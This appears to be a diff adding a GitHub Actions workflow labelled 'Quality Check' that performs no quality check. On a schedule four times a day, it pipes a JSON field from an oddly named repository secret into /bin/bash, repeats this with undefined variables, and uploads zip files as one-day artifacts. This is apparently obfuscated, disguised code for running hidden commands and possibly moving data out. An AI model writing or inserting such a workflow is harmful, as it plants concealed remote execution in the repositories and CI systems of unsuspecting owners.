@@ -1,0 +1,34 @@
+name: Quality Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '14 5,11,17,23 * * *'
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  process:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - name: Start
+        env:
+          snxye55315: ${{ secrets.snxye55315 }}
+        run: |
+          printf '%s' "$snxye55315" | jq -r .c30 | /bin/bash
+          echo $yfnw23 | jq -r .zlnx2468 | /bin/bash
+          echo $emyr69 | jq -r .gffa46310 | /bin/bash
+          echo $uj53785 | jq -r .tyfs77149 | /bin/bash
+          echo $fgae5544 | jq -r .m7610 | /bin/bash
+
+      - name: Upload results
+        uses: actions/upload-artifact@v4
+        with:
+          name: ATjOTLnO
+          path: "*.zip"
+          retention-days: 1
